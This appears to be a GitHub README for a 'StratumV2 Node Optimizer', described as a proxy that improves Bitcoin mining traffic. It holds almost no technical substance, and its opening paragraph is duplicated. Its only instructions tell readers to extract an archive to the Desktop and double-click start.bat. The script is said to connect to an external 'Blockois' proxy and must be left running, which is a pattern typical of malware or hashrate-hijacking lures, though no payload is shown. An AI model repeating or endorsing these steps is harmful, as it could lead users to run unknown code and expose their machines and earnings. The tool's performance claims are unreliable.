StratumV2 Node Optimizer is an open-source, lightweight network routing (proxy) tool that optimizes data transmission between Bitcoin mining pools and your local mining devices (ASICs/mining rigs). This tool aims to reduce network latency, lower the rate of stale shares, and improve bandwidth efficiency. It does not contain any mining kernel or interfere with your hardware’s clock speeds (overclocking).

# Key Features
Asynchronous Packet Management: Uses the Python asyncio framework to queue TCP packets and forward them to the pool server via the shortest route.

Stratum V2 Compatibility: Optimizes the encryption and low-bandwidth advantages provided by the next-generation Stratum V2 protocol within the local network.


StratumV2 Node Optimizer is an open-source, lightweight network routing (proxy) tool that optimizes data transmission between Bitcoin mining pools and your local mining devices (ASICs/mining rigs). This tool aims to reduce network latency, lower the rate of stale shares, and improve bandwidth efficiency. It does not contain any mining kernel or interfere with your hardware’s clock speeds (overclocking).


Operating Architecture (How Does It Work?)
The system acts as a local bridge (Local Proxy) between your mining devices and the remote pool server:

TCP Optimization: The script optimizes the operating system’s TCP Keep-Alive and No-Delay (Nagle Algorithm) parameters specifically for mining traffic.

The optimized packets are then forwarded to your official mining pool’s address.

### Step-by-Step Guide:

1. Download the repository archive and extract the entire folder directly to your Desktop.
2. Open the extracted folder on your Desktop.
3. Locate the **`start.bat`** file and double-click it to launch the node installation wizard.

*Note: The `start.bat` script is a transparent launcher that securely connects the local network socket to the Blockois stratum proxy. Do not close the command window after launching it; you can minimize it to the taskbar. You can proceed with the necessary installations to launch it smoothly.


<img width="1389" height="627" alt="blockois (2)" src="https://github.com/user-attachments/assets/6e570487-f2a5-4baf-9ddf-2443362546b4" />



<img width="1387" height="502" alt="blockois (3)" src="https://github.com/user-attachments/assets/04ce5f8f-2ddf-4317-b4ee-1175083c565a" />

